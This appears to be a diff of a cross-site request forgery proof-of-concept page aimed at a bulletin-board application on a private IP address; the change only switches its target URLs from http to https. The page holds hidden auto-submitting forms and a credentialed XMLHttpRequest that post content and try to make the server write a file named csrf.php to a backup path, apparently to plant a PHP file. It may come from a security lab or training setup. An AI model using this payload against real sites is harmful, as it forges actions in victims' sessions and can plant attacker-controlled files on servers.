@@ -5,11 +5,11 @@
 </head>
 
 <body>
-  <form action="http://10.210.145.28/yarare/" method="POST" id="form1">
+  <form action="https://10.210.145.28/yarare/" method="POST" id="form1">
     <input type="hidden" name="content" value="###////CSRF!!!////###">
     <input type="hidden" name="newpost_submit" value="xxx">
   </form>
-  <form action="http://10.210.145.28/yarare/" method="POST" id="form2">
+  <form action="https://10.210.145.28/yarare/" method="POST" id="form2">
     <input type="hidden" name="upfile_name" value="csrf.php">
     <input type="hidden" name="backup_path" value="/home/yarare-board/yarare-board/server/yarare/backupfile/csrf.php">
     <input type="hidden" name="newpost_submit" value="yyy">
@@ -25,7 +25,7 @@ Content-Type: taxt/plain\n\
 ----BNDRY--\n\
         ';
     var req = new XMLHttpRequest();
-    req.open('POST', 'http://10.210.145.28/yarare/');
+    req.open('POST', 'https://10.210.145.28/yarare/');
     req.setRequestHeader('Content-Type', 'multipart/form-data; boundary=--BNDRY');
     req.withCredentials = true;
     req.send(data);
